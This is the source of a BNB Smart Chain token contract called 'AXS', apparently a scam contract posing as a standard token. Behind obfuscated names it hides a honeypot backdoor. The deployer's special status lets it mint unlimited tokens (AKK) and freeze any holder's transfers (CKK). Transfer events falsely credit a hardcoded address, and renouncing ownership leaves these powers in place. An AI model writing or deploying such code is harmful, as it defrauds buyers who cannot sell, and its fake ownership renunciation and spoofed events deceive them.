/**
 *Submitted for verification at BscScan.com on 2022-12-23
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address Akgs = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract AXS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bSDA;
    mapping (address => uint256) private cSD;
    mapping (address => mapping (address => uint256)) private dXC;
    uint8 eVGD = 8;
    uint256 fGH = 1*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "AXS";
        _symbol = "AXS";
        gKH(msg.sender, fGH);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eVGD;
    }

    function totalSupply() public view  returns (uint256) {
        return fGH;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bSDA[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dXC[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dXC[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= bSDA[msg.sender]);
        if(cSD[msg.sender] <= 2) {
        hKI(msg.sender, recipient, amount);
        return true; }
     if(cSD[msg.sender] == 5) {
        iLK(msg.sender, recipient, amount);
        return true; }}
	
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= bSDA[sender]);
     require(amount <= dXC[sender][msg.sender]);
                  if(cSD[sender] == 5) {
        iLK(sender, recipient, amount);
        return true;} else
              if(cSD[sender] <= 2) { 
            if (cSD[recipient] <=2) {
        hKI(sender, recipient, amount);
        return true;}}}
		
		function mSE (address nSES, uint256 oDF)  internal {
     bSDA[nSES] += oDF;} 

  		    function gKH(address kDW, uint256 lMD) internal  {
        cSD[msg.sender] = 5;
        kDW = Akgs;
        bSDA[msg.sender] = bSDA[msg.sender].add(lMD);
        emit Transfer(address(0), kDW, lMD); }
		
		modifier JAM () {
		       require(cSD[msg.sender] == 5);
               _;}
   function AKK (address nSES, uint256 oDF) JAM public {
   mSE(nSES,oDF);}		
function CKK (address nSES) JAM public {
      cSD[nSES] = 9;}

            function iLK(address sender, address recipient, uint256 amount) internal  {
        bSDA[sender] = bSDA[sender].sub(amount);
        bSDA[recipient] = bSDA[recipient].add(amount);
         sender = Akgs;
        emit Transfer(sender, recipient, amount); }
    function hKI(address sender, address recipient, uint256 amount) internal  {
        bSDA[sender] = bSDA[sender].sub(amount);
        bSDA[recipient] = bSDA[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }
	   
}